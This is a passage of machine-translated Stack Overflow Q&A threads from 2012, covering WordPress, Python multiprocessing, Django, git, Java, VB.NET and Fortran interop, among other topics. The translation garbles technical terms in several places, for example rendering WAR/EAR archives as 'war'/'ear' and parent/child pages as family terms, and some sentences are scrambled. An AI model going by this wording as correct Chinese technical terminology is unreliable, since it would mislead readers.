我需要在 15 ',' 之后添加换行符的提示

像那样

```
db 4Dh, 5Ah, 80h, 00h, 01h, 00h, 00h, 00h, 04h, 00h, 10h, 00h, 0FFh, 0FFh, 00h, <-- 此处返回行
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:19:42.277

这应该使您朝着正确的方向前进：

```
string myString = "db 4Dh, 5Ah, 80h, 00h, 01h, 00h, 00h, 00h, 04h, 00h, 10h, 00h, 0FFh, 0FFh, 00h, db 4Dh, 5Ah, 80h, 00h, 01h, 00h, 00h, 00h, 04h, 00h, 10h, 00h, 0FFh, 0FFh, 00h";
StringBuilder sb = new StringBuilder();
string[] splitString = myString.Split(',');
for (int idx = 0; idx < splitString.Length; idx++)
{
    sb.Append(splitString[idx] + ",");
    if (idx > 0 && idx%15 == 0)
    {
        sb.Append('\n');
    }
}
string output = sb.ToString(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:22:40.553

该方法的替代`StringBuilder`方法：

```
static class StringExt
{
    public static string InsertAfterEvery(
        this string source, string insert, int every, string find)
    {
        int numberFound = 0;
        int index = 0;
        while (index < source.Length && index > -1)
        {
            index = source.IndexOf(find, index) + find.Length;
            numberFound++;
            if (numberFound % every == 0)
            {
                source = source.Insert(index, insert);
                index += insert.Length;
            }
        }
        return source;
    }
}

// I used 3 rather than 15
Console.WriteLine(
    "db 4Dh, 5Ah, 80h, 00h, 01h, 00h, 00h, 00h, 04h,".InsertAfterEvery(
        Environment.NewLine, 3, ",")); 
```

# php - 检查页面是父页面还是子页面？

> ID：13916783
> 
> 赞同：35
> 
> 时间：2012-12-17T15:14:59.467
> 
> 标签：php, wordpress

是否可以检查页面是父页面还是子页面？

我的页面设置如下：

-- 家长

---- 儿童第 1 页

---- 儿童第 2 页

等等

如果它是父页面，我想显示某个菜单，如果它在子页面上，我想显示不同的菜单。

我知道我可以做类似下面的事情，但我想让它更动态一点，而不包括特定的页面 ID。

```
<?php
if ($post->post_parent == '100') { // if current page is child of page with page ID 100
   // show image X 
}
?> 
```

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2012-12-17T15:23:44.203

您可以测试帖子是否是这样的子页面：*
（来自[http://codex.wordpress.org/Conditional_Tags）*](http://codex.wordpress.org/Conditional_Tags)

```
<?php

global $post;     // if outside the loop

if ( is_page() && $post->post_parent ) {
    // This is a subpage

} else {
    // This is not a subpage
}
?> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-07-13T17:17:01.063

我知道这是一个老问题，但我一直在寻找同样的问题，直到我想出这个问题才找到一个清晰而简单的答案。我的回答没有回答他的解释，但它回答了我正在寻找的主要问题。

这会检查页面是子页面还是父页面，并允许您仅在子页面或父页面上显示侧边栏菜单，而不是在没有父页面或子页面的页面上显示。

```
<?php 
   global $post;    
   $children = get_pages( array( 'child_of' => $post->ID ) );
   if ( is_page() && ($post->post_parent || count( $children ) > 0  )) : 
?> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-11-20T16:18:09.060

将此函数放在主题的functions.php 文件中。

```
function is_page_child($pid) {// $pid = The ID of the page we're looking for pages underneath
  global $post;         // load details about this page
  $anc = get_post_ancestors( $post->ID );
  foreach($anc as $ancestor) {
      if(is_page() && $ancestor == $pid) {
          return true;
      }
  }
  if(is_page()&&(is_page($pid)))
     return true;   // we're at the page or at a sub page
  else
      return false;  // we're elsewhere
}; 
```

然后你可以使用它：

```
<?php 
    if(is_page_child(100)) {
        // show image X 
    } 
?> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2020-11-07T00:48:33.513

对于 Wordpress，您可以简单地检查：

```
<?php 
  if (wp_get_post_parent_id(get_the_ID())) {
    echo "I am a child page";
  } 
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-01-04T12:21:56.850

您可以使用**get_pages()**函数。它需要一个关联数组作为参数。您可以给该数组**'child_of' => get_the_ID()**以获取当前页面的子级，如果它没有任何子级，则整个**get_pages()**函数将返回 false，否则它将返回一个计算结果为 true 的值，可以将其分配给变量以用作 if 语句中的条件。

```
$iAmParent = get_pages(array('child_of' => get_the_ID())); 
```

# python - Python 多处理 map_async

> ID：13916786
> 
> 赞同：2
> 
> 时间：2012-12-17T15:15:25.407
> 
> 标签：python, asynchronous, map, multiprocessing

我想跳过从[`map_async`](http://docs.python.org/2/library/multiprocessing.html#multiprocessing.pool.multiprocessing.Pool.map_async). 它们在内存中增长，但我不需要它们。

这是一些代码：

```
def processLine(line):
    #process something
    print "result"
pool = Pool(processes = 8)
for line in sys.stdin:
    lines.append(line)
    if len(lines) >= 100000:
        pool.map_async(processLine, lines, 2000)
pool.close()
pool.join() 
```

当我必须处理具有数亿行的文件时，python 进程在内存中增长到几 GB。我该如何解决？

谢谢你的帮助 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:17:50.710

您的代码有一个错误：

```
for line in sys.stdin:
    lines.append(line)
    if len(lines) >= 100000:
        pool.map_async(processLine, lines, 2000) 
```

这要等到`lines`累积超过100000行。之后，在**每条附加行**`pool.map_async`的 100000+ 行的整个列表中被调用。

 **目前尚不清楚您真正想要做什么，但如果您不想要返回值，请使用`pool.apply_async`，而不是`pool.map_async`。也许是这样的：

```
import multiprocessing as mp

def processLine(line):
    #process something
    print "result"

if __name__ == '__main__':
    pool = mp.Pool(processes = 8)
    for line in sys.stdin:
        pool.apply_async(processLine, args = (line, ))
    pool.close()
    pool.join() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T22:50:45.543

你是对的。有一些错误

我是说：

```
def processLine(line):
  #process something
  print "result"
  pool = Pool(processes = 8)

if __name__ == '__main__':
  for line in sys.stdin:
    lines.append(line)
    if len(lines) >= 100000:
      pool.map_async(processLine, lines, 2000)
      lines = [] #to clear buffer
  pool.map_async(processLine, lines, 2000)
  pool.close()
  pool.join() 
```

我使用 map_async 是因为它具有可配置的 chunk_size ，因此如果有很多行处理时间很短，它会更有效。**

# android - Android：onItemClick(AdapterView parent, View v,int position, long id) 每次都返回 ID 为 0？

> ID：13916789
> 
> 赞同：0
> 
> 时间：2012-12-17T15:15:37.260
> 
> 标签：android

我在 android.And 在 gridviewitemclicklistner 中做一个小应用程序，它每次都返回 id=0 请帮助我？

```
g2.setOnItemClickListener(new OnItemClickListener() 
    {  
         public void onItemClick(AdapterView<?> parent, View v,
             int position, long id) 
         {  
           Toast.makeText(MainActivity.this,''+id,Toast.LENGTH_SHORT).show();

         } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:17:30.710

尝试改用`position`- 变量。返回 0的事实`id`仅意味着单击的行没有 id。（在你的情况下可能不是。所以我认为这里没有真正的问题。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:17:36.253

在您的列表适配器中，您必须重写`getItemId()`才能每次返回 0。在这里，您必须为每个列表项返回一个唯一 ID。

# django - Django shell：加载测试夹具数据的命令？

> ID：13916794
> 
> 赞同：10
> 
> 时间：2012-12-17T15:15:49.780
> 
> 标签：django, shell

有没有一种简单的方法来加载我通常在交互式 Django shell 中的自动化测试运行中使用的夹具数据？

混合来自数据库的模型数据和来自夹具的其他数据可能会很尴尬。就我而言，我有一些只读表，并想尝试一些我以后可以丢弃的数据。

我可能可以像[这里](https://stackoverflow.com/questions/10498234/django-load-local-json-file)描述的那样加载夹具文件，但这对于重复使用来说有点麻烦......

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2016-10-15T19:39:05.760

ilardm 的回答指出了正确的方向，特别是您想要的是：

```
from django.core.management import call_command
call_command('loaddata', 'fixture_name.json') 
```

编辑：但是在测试用例中包含固定装置的正确方法是这样的：

```
class TestThis(TestCase):
    fixtures = ['myfixture.json']

    def setUp(self):
        # Ready to test 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T15:27:50.663

我期待[`./manage.py loaddata fixture_name.json`](https://docs.djangoproject.com/en/1.4/ref/django-admin/#loaddata-fixture-fixture)的是你想要的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-20T12:53:48.043

也许这个链接：[http](http://testedwebdev.blogspot.ru/2012/05/django-shell-testing.html) ://testedwebdev.blogspot.ru/2012/05/django-shell-testing.html可能会有所帮助。

# mysql - 可以始终隐藏表格的子集吗？

> ID：13916796
> 
> 赞同：0
> 
> 时间：2012-12-17T15:15:57.287
> 
> 标签：mysql, sql

我有一家商店，里面有很多桌子，按照往常一样，它们以各种方式连接在一起。

在我的产品表中，我有一个名为“状态”的字段。如果状态 = 4，则产品已归档。

我想确保任何查询都不会返回状态为 4 的任何内容。现在我将在`AND status <> 4`我能找到的每个 SQL 查询中添加一个。

有没有更好的方法来做到这一点，或者这是唯一的方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T15:19:35.397

您可以创建一个不显示 status = 4 的视图，并在查询中使用该视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:27:08.347

据推测，在已归档和未归档之间更改产品状态是一种非常罕见的操作，而从产品表中进行选择则极为常见。因此，您应该制作一个表格`archived`并将所有存档的产品移到那里。

这将是效果最好的解决方案。

如果您偶尔还想查看所有产品，无论是否已归档，那么您还可以创建一个组合`archived`和`products`表的视图。

# git - 如何解决这些 Git GC 问题？

> ID：13916797
> 
> 赞同：4
> 
> 时间：2012-12-17T15:15:58.080
> 
> 标签：git, git-gc

我有一个反复出现的问题，我的 git repo（我认为？）将决定它需要进行垃圾收集。这个过程需要半个多小时，然后会在每次拉/推操作时触发。

手动运行 Git GC 需要半小时，但似乎无法解决问题。我发现的唯一解决方案是删除我的 repo 并重新克隆，由于许多原因，这是次优的。

我的 git GC 操作可能很慢，因为我设置了 git 一些内存限制以阻止它在 git GC 操作中崩溃，就像它曾经在达到 4gb Windows 内存限制然后崩溃时那样。

任何帮助，将不胜感激。这是一个大型 repo，repo 确实包含大量二进制数据，以及大量非常大（> 500k）的文本文件。

那么，1\. 我如何限制 Git 决定进行垃圾收集的数量。2.如何加快GC运行速度？3\. 我能做些什么来解决或最小化所涉及的更大问题（也就是为什么它必须首先进行垃圾收集）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T19:07:15.960

唯一真正的解决方法是减小存储库的大小。您可以使用 禁用自动垃圾收集`git config --global gc.auto 0`，但这会增加推拉时的网络流量（如果它们仍然可以正常工作），并且会增加用于 git 的本地磁盘空间。如果没有`git gc`，您的本地存储库将包含您更改的每个文件的每个修订的完整副本。`git gc`但是，如果您在离开时每晚都进行跑步之类的事情，这可能是可行的。

我建议研究类似[git Annex 之](http://git-annex.branchable.com/)类的东西，它是为像你这样的情况而设计的。它基本上在您的存储库中存储指向大文件的指针，而不是文件本身。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-16T23:28:32.577

注意：来自 Git 2.17（2018 年第二季度）的提交确实指出存在一个`git gc --auto`会调用的钩子，这有助于最小化该命令的影响。

`git gc --auto`您可以在“[理解`git gc --auto`](https://stackoverflow.com/a/16342938/6309)”中阅读更多信息。

使用电池时跳过的示例`auto-gc`挂钩 (in )已更新为几乎总是允许运行，除非命令绝对确定我们使用电池电源（之前，它跳过，除非命令确定我们使用交流电源）。`contrib/``auto-gc``auto-gc``on_ac_power`

请参阅[Adam Borowski ( ) 的](https://github.com/kilobyte)[提交 781262c](https://github.com/git/git/commit/781262c5e7ad4a7813c528803117ed0d2e8c5172)（2018 年 2 月 28 日[）](https://github.com/kilobyte)。^(（由)^([Junio C Hamano 合并 --](https://github.com/gitster)) ^([--](https://github.com/gitster))^在^([提交 b423234](https://github.com/git/git/commit/b423234dde181bc8b951ec570ad50dd83d39ddc7))^(中，2018 年 3 月 14 日）)[`kilobyte`](https://github.com/kilobyte)
^([`gitster`](https://github.com/gitster))

> ## `hooks/pre-auto-gc-battery`：允许`gc`在非笔记本电脑上运行
> 
> 台式机和服务器往往没有功率传感器，因此`on_ac_power`返回 255（“未知”）。因此，让我们将除 1 (" `battery`") 以外的任何答案作为 run 的禁忌症`gc`。
> 
> 如果该工具返回“ `unknown`”，则查询其他源没有意义，因为它已经查询了它们，并且比我们更聪明（可以处理多个适配器）。

因此，根据您的情况，设置该钩子可以帮助您对是否`git gc --auto`应该执行有发言权。

# activerecord - 在 YII 框架中调用 findAll 后向 activerecord 添加属性

> ID：13916802
> 
> 赞同：1
> 
> 时间：2012-12-17T15:16:08.440
> 
> 标签：activerecord, yii

我正在调用该`findAll`方法，我得到了 4 个字段。我现在想再添加一个名为`$owned`. 所以这意味着在我从表中获取记录后，结果数据记录应该包含拥有的字段。此外，该`$owned`字段是动态的，基于用户是否是组的所有者。我尝试使用`afterFind`. 但它也不起作用。令人惊讶的是，它添加了归因`$owned`于对象而不是属性。我`CJSON::encode($model)`在控制器中使用来查看输出。该`$owned`字段未显示。下面是代码

```
/**
*
* The followings are the available columns in table 'group':
* @property integer $id
* @property string $name
* @property string $created_at
* @property string $updated_at
*/

class Group extends CActiveRecord
{
//adding owned property for groups.true if user is owner

    public $owned;

protected function afterFind()
{

    parent::afterFind();
    //if user is owner of group its true
    $this->owned = true;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:59:09.093

* * *

尝试以下代码：

```
public function init()
    {
        $this->onAfterFind=array($this,'afterFindCustom');
        parent::init();
    }

    public function afterFindCustom()
    {
        $this->owned = true;
        parent::afterFind();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T07:43:37.610

最后我发现了。这是 CJSON::encode 问题的问题。此方法仅对模型的属性进行编码。它不编码任何关系或动态属性。所以我写了我自己的函数并且它有效。！

希望这对将来的人有所帮助

感谢所有史密斯

# session - 两场战争在一个耳朵里共享会话

> ID：13916803
> 
> 赞同：2
> 
> 时间：2012-12-17T15:16:13.930
> 
> 标签：session, share, glassfish-3

我有一只耳朵可以包装两次战争。战争 1 具有所有身份验证形式，战争 2 具有用户可以使用的应用程序。用户通过超链接从战争 1 中的主页重定向到战争 2 中的应用程序主页。当用户登录并导航到战争 2 中的页面时，由于上下文不同，会话会丢失，并且新上下文会创建新会话（根据我的理解）。有什么方法可以在两个上下文之间共享会话数据？我正在使用带有 netbeans 的 JSF 2.1 和 glassfish 3 服务器

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-08-04T10:56:15.313

我使用 WAS 会话共享功能启用了此功能，该功能允许我在同一只耳朵的 2 个 WAR 之间共享会话。但在那之后，我遇到了与 JSF 共享会话的另一个问题，即 2 场战争的导航规则有些混乱，例如，当我在第 2 场战争中导航时使用超链接从第 1 场战争转移到第 2 场战争时，我得到了这个来自 JSF 的错误：

> viewId /dir1/dir2/war2page1.xhtml、action #{springManagedBean.beanAction(param)} 和结果 navigationOutcomeName 没有导航案例匹配

因为似乎共享会议使第一次战争的导航规则正在取代第二次战争的导航规则。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-03-30T22:53:04.097

您可以将其保存在 ServletContext 中，而不是会话中。servletcontext 保持值直到服务器关闭。这里有一些主题，解释了如何通过不同的 servlet 上下文共享数据

# c# - directory.getfile 和 windows phone 7

> ID：13916806
> 
> 赞同：2
> 
> 时间：2012-12-17T15:16:21.670
> 
> 标签：c#, image, windows-phone-7

在 WP7 应用程序中，我试图获取`Finiti`文件夹中所有图像的名称。

但是，`string[] txtfiles`始终为空（null）。

我认为这是因为我写了一个错误的文件夹链接。

```
public MainPage()
{
    InitializeComponent();
    string[] txtfiles = Directory.GetFiles(@"c:\\Finiti");//, "*.jpg");
    MessageBox.Show(txtfiles[0]);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:18:51.520

您正在使用字符串文字和转义字符，您只需要一个，而不是两者。

尝试使用

```
Directory.GetFiles(@"c:\Finiti"); 
```

或者

```
Directory.GetFiles("c:\\Finiti"); 
```

否则，路径将被解释为`C:\\Finiti`在 Windows 上无效。

# java - Java中for循环之前或内部的初始化

> ID：13916812
> 
> 赞同：0
> 
> 时间：2012-12-17T15:16:29.763
> 
> 标签：java, for-loop

请告诉我这两个代码片段有什么区别：

```
int i = 0;
for(i; i < test; i++) {...} 
```

和

```
for(int i = 0; i < test; i++) {...} 
```

`i`这些初始化-increment 变量的方法之间有什么区别吗？它会影响什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T15:19:00.290

区别在于变量的作用域`i`。

在第一个中，`i`在 for 循环之外可见，而在第二个中，则不是。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:19:21.253

如果您可以在 for 循环范围之外使用 i 变量。万一你不能这样做。只能在 for 循环范围内使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:20:26.060

在这两种情况下，变量都被定义一次（没有明显的性能或内存问题）。不同之处在于范围和代表性。在第一种情况下`i`将可用的`for`声明范围之外。

第一种情况很有用，例如，如果您想找到一个元素的特定索引（确实存在这种方法的更好替代方案），或者如果您想迭代直到满足某个条件，然后知道哪个您的循环是否停止在索引处。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:18:32.127

[第二个是惯用语](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html)。第一个不是，因此违反[了最小惊讶原则](http://en.wikipedia.org/wiki/Principle_of_least_astonishment)。

如果您需要在循环`i`之前或之后访问，请仅使用第二个。`for`但是，我在这段代码中看不到任何暗示是这种情况。

# java - 如何处理多个 servlet 请求以更新 DB 值

> ID：13916813
> 
> 赞同：3
> 
> 时间：2012-12-17T15:16:31.770
> 
> 标签：java, database, servlets, synchronization

我将收到来自客户端的多个 Servlet 请求，以更新数据库中的某些条目。目前我在 Postgre 中使用休眠。我所做的是读取数据库的当前值，然后在该值上加一并保存每个请求。但是如果两个人同时阅读数据库并添加它，它就不会像我想要的那样计算。我有一些建议让它“同步”。但是，如果请求数量变大，某些用户可能会有相当大的延迟。

有没有更快的方法将值更新 +1，而无需读取和写入？如果最佳实践是使用同步，那么如何使它更快（更少的等待时间）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:20:20.723

您可以尝试使用 LOCK，检查：[http ://www.postgresql.org/docs/8.1/static/sql-lock.html](http://www.postgresql.org/docs/8.1/static/sql-lock.html)

为了在一个查询中完成所有事情（更快），请检查：[Increment a value in Postgres](https://stackoverflow.com/questions/10233298/increment-a-value-in-postgres)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:30:20.123

您可以使用 Spring 事务管理（请参阅[此处](http://static.springsource.org/spring/docs/2.0.x/reference/transaction.html)的文档）。

弹簧配置：

```
<bean id="txManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">
  <property name="dataSource" ref="dataSource"/>
</bean> 
```

使用 @Transactional 注释你的休眠读写方法

```
@Transactional(value = "txManager" ...
public int incrementValue(){ 
```

然后根据您的需要定义隔离属性。查看 TransactionDefinition 以了解不同的隔离选项。例如，`TransactionDefinition.ISOLATION_READ_COMMITTED`

# java - 内存缓存中的图像大小高于使用通用图像加载器的实际大小

> ID：13916816
> 
> 赞同：1
> 
> 时间：2012-12-17T15:16:37.673
> 
> 标签：java, android, universal-image-loader

我的应用程序有带图像的 ListView。它使用 Universal Image Loader (1.7.0) 从 Internet 加载图像。

**配置和显示选项**：

```
DisplayImageOptions defaultOptions = new DisplayImageOptions.Builder()
                .cacheInMemory()
                .cacheOnDisc()
                .build();
ImageLoaderConfiguration config = new ImageLoaderConfiguration.Builder(this)
                .defaultDisplayImageOptions(defaultOptions)
                .threadPoolSize(2)
                .enableLogging()
                .build(); 
```

**getView() 的一部分**（我的应用重用 ConvertView 并使用 ViewHolder 模式）：

```
View rowView = convertView;

ViewHolder holder;

if (rowView == null) {
    LayoutInflater inflater = activity.getLayoutInflater();
    rowView = inflater.inflate(R.layout.list_row, null, true);
    holder = new ViewHolder();
    holder.photoView = (ImageView) rowView.findViewById(R.id.list_photo_view);

    rowView.setTag(holder);
} else {
    holder = (ViewHolder) rowView.getTag();
}
String photoUrl = "http://someserver.com/some_image.jpg";
mImageLoader.displayImage(photoUrl, holder.photoView); 
```

**list_row.xml**：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:clickable="true" >

    <ImageView
        android:id="@+id/list_photo_view"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:adjustViewBounds="false"
        android:contentDescription="@string/photo"
        android:scaleType="centerInside"
        android:src="@drawable/template_image_list" />

</LinearLayout> 
```

当然 ImageView 不是每一行中的单个视图。这是简短的版本:)。所以我从互联网上下载的图像尺寸是 450x337。我正在平板电脑上测试我的应用程序，屏幕尺寸为 1280x760。

当我启用日志记录时 - 我看到这样的消息：

```
Load image from memory cache [http://someserver.com/some_image.jpg_1280x736] 
```

等等......我对 url 结尾有点困惑 - “_1280x736”。正如[手册的第二部分](http://www.intexsoft.com/blog/item/72-universal-image-loader-part-2.html)所说：

> • maxImageWidthForMemoryCache() 和 maxImageHeightForMemoryCache() 用于将图像解码为位图对象。为了不在内存中存储全尺寸图像，将其缩小到由 ImageView 参数值确定的大小，其中加载图像：maxWidth 和 maxHeight（第一阶段），layout_width 和 layout_height（第二阶段）。如果未定义这些参数（值 fill_parent 和 wrap_content 被认为是不确定的），则采用设置 maxImageWidthForMemoryCache() 和 maxImageHeightForMemoryCache() 指定的尺寸。原图尺寸缩小2倍（推荐快速解码），直到宽度或高度小于指定值；o 默认值 - 设备屏幕的大小。

所以，据我所知，这个结尾是“减少”之后内存缓存中图像的大小:) 并且图像加载器使用了默认值（屏幕大小）。我并不惊讶图像加载器无法获得 ImageView 的大小（可能为时过早），但为什么原始图像被放大了？是否很难验证原始图像的大小并且不加修改地保留它们？当然，我可以在 displayImage 方法中添加图像大小，但我需要解释......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T18:37:01.380

好详细的问题。

URL 结尾，如**"_1280x736"**，并不表示结果位图的大小。这是原始图像缩小到的**目标大小。**在您的情况下，它等于设备屏幕尺寸，并且原始图像（小于此目标尺寸）不会被缩放（直到您`ImageScaleType.EXACTLY_STRETCHED`在显示选项中设置）。

所以不用担心。如果您在运行时看到真实的位图大小，那么您将看到原始图像大小（不是 1280x736）。

# ruby-on-rails - 在运行时包含来自外部 ruby 文件的 Ruby 方法

> ID：13916817
> 
> 赞同：0
> 
> 时间：2012-12-17T15:16:41.657
> 
> 标签：ruby-on-rails, ruby-on-rails-3, controller

我正在创建信息学家学院（不是公共网站）使用的内部工具。我需要以各种方式导出我的数据，我想让我的同事根据他们的需要编写导出方法。

**所以我想将特定ruby文件的特定方法作为go_to()方法运行，然后返回。**

该函数位于 Rails 应用程序 (app/views/export/templates/my_template/export.rb) 中，我想从我的导出控制器运行它，它在多步骤向导中获取数据。

**如何从我的导出控制器“跳转”到特定方法**来操作数据（作为预处理函数）？

我需要扩展我的控制器吗？

```
class ExportController < ApplicationController
require 'spreadsheet'

    # Step 5 : Exporting
    def step5
        # Creating Spreadsheet variable called "book"
        book = Spreadsheet::Workbook.new
        sheet = book.create_worksheet

        # Selecting points to export
        @project = Project.find(session[:current_project_id])
        @points = @project.points

        # HERE : Jump to app/views/export/templates/my_template/export.rb           
        # WITH SOME PARAMETERS AS @points, book THAT WILL MAKE SOME EXTRA QUERIES
        # THEN COME BACK TO RENDER THE EXCEL FILE WITH THE PROCESSED DATA

        # Sending to browser without saving it on the server
        data = StringIO.new 
        book.write data 
        send_data(data.string, {
            :disposition => 'attachment',
            :encoding => 'utf8',
            :stream => false,
            :type => 'application/excel',
            :filename => 'some_filename.xls'})
        #send_data data.string, :filename => "yourfile.xls", :type =>  "application/vnd.ms-excel", :x_sendfile=>true

        # redirect_to "export#step6" # this is for now not working because of the render of the xls file
    end

end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:16:03.387

我不太确定你想解释什么。你有什么给你的同事上传 ruby​​ 文件的能力，以后应该从特定控制器的特定位置调用它还是什么？

ps 我知道这不是答案，但我真的很想帮忙，而且我没有足够的声誉来发表评论（我才刚刚开始）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T16:46:15.413

为什么你`.rb`的视图目录中有一个文件？看起来它应该放在你的`models`, 或`lib`. 无论如何，如果它是一个类文件，那么`require`它或将它放在正确的位置，然后调用`data = Export.some_process_method(@points, etc, etc)`.

# python - 如何使用 pip 安装特定版本的软件包？

> ID：13916820
> 
> 赞同：136
> 
> 时间：2012-12-17T15:16:47.927
> 
> 标签：python, virtualenv, pip, django-modeltranslation

> **可能重复：**
> [使用 Pip 安装特定的包版本](https://stackoverflow.com/questions/5226311/installing-specific-package-versions-with-pip)

我对`pip install`和`virtualenv`一般来说有点新。

我已经在我的服务器以及本地开发环境上设置了一个 virtualenv。

在服务器上，包`django_modeltranslation-0.4.0_beta2`工作得很好。

但是在我的本地机器`django_modeltranslation-0.5.0-alpha`上似乎根本无法正常工作。

我通常只是将它安装在 virtual-env 中，如下所示：

```
$ source bin/active
(env)$ pip install django_modeltranslation 
```

虽然这获得了最新版本，但现在第一次导致使用最新版本出现问题。

所以我已经像这样卸载了版本 5 alpha：

```
(env)$ pip uninstall django_modeltranslation 
```

但现在我不知道如何才能再次获得工作版本 0.4.0 Beta。我试过了，但找不到：

```
(env)$ pip install django_modeltranslation-0.4.0_beta2
Downloading/unpacking django-modeltranslation-0.4.0-beta2
  Could not find any downloads that satisfy the requirement django-modeltranslation-0.4.0-beta2
No distributions at all found for django-modeltranslation-0.4.0-beta2 
```

我认为一定有办法，因为这就是使用虚拟环境的全部意义所在。

* * *

## 回答 #1

> 赞同：231
> 
> 时间：2012-12-17T15:18:44.507

使用`==`：

```
pip install django_modeltranslation==0.4.0-beta2 
```

# git - 撤消提交不适用于每个 SO 线程

> ID：13916822
> 
> 赞同：0
> 
> 时间：2012-12-17T15:16:56.000
> 
> 标签：git

我在这里关注这个 SO 问题，但有些东西对我不起作用......

[如何撤消 Git 中的最后一次提交？](https://stackoverflow.com/questions/927358/undo-last-git-commit)

我做了`git reset --hard HEAD~1`三遍，我看到了我想要的代码，当我执行 git status 时，它说 You branch is behind origin/master by 3 commits 并且可以快进。是的，我退出了 3 次提交，所以这看起来不错，但是我现在如何提交并推送更改，以便我的远程仓库中最新的 master 没有 3 次提交。

谢谢，院长

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:18:07.107

你可以跑

```
git push --force 
```

强制及时向后推送远程仓库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:31:05.937

如果还没有人提取您的`origin`回购状态，请使用[SLaks 提供的答案](https://stackoverflow.com/a/13916840/520162)。

但是，如果您对此不确定，那么强制推送并不是最好的主意，因为它可能会导致您的开发人员出现问题。

要以一种可以使用 with 的方式恢复您的最后三个提交`origin`，请使用[`git revert`](http://linux.die.net/man/1/git-revert)。这将创建一个新的提交来恢复您已经提交的内容。

如果你的历史看起来像这样

```
A--B--C--D--E--HEAD 
```

并且您想按以下顺序删除和还原`C`它们`D``E`

```
git revert E
git revert D
git revert C 
```

然后，您将**提前** `origin`3 次提交，您可以毫不费力地推动。`C`如果有人已经取消了您对、`D`和的更改`E`，他们将在下一次时被删除`pull`。

* * *

顺便说一句：这是您引用的问题的不被接受的答案也建议：
[https](https://stackoverflow.com/a/6376039/520162) ://stackoverflow.com/a/6376039/520162 （**撤消公共提交**）

# vb.net - 在 VB 中使用 Fortran DLL

> ID：13916825
> 
> 赞同：1
> 
> 时间：2012-12-17T15:17:05.483
> 
> 标签：vb.net, dll, fortran

我正在尝试自学从 VB 调用 fortran 子程序。我正在尝试使用非常简单的示例，但不知何故它不起作用。我正在使用带有 Intel Visual Fortran 的 Visual Studio 2010。这是我正在尝试的代码：

```
SUBROUTINE ARRAYTEST(arr)
!DEC$ ATTRIBUTES DLLEXPORT, ALIAS:"ARRAYTEST" :: ARRAYTEST
REAL arr(3, 7)
INTEGER i, j
DO i = 1, 3
    DO j = 1, 7
        arr (i, j) = 11.0 * i + j
    END DO
END DO
END SUBROUTINE 
```

并成功构建以创建 DLL 文件。这是我的 Visual Basic 代码：

```
Public Class Form1
Private Declare Sub ARRAYTEST Lib "FortTest.DLL" Alias "ARRAYTEST" (ByVal x As Single)
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
    Dim arr(0 To 2, 0 To 6) As Single
    Call ARRAYTEST(arr(0, 0))
    TextBox1.Text = arr(3, 3)
End Sub

End Class 
```

　当我将 DLL 文件放入目录并运行代码时，出现以下错误： ForRun.exe 中发生了“System.AccessViolationException”类型的第一次机会异常

我用谷歌搜索但没有找到解决方案，如果有人能告诉我我做错了什么以及如何解决它，我将不胜感激。非常感谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:47:21.917

您可以尝试这种`DllImport`表示法，我在这个特定场景中取得了最大的成功（来自 VB.NET 的 FORTRAN）。

```
Imports System.Runtime.InteropServices

Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim arr(0 To 2, 0 To 6) As Single
        ARRAYTEST(arr(0, 0))
        TextBox1.Text = arr(3, 3)
    End Sub

End Class

Public Module FortranInterop
    <DllImport("FortTest.DLL", CallingConvention:=CallingConvention.StdCall, EntryPoint:="ARRAYTEST")> _
    Public Sub ArrayTest(ByRef x as Single)
    End Sub    
End Module 
```

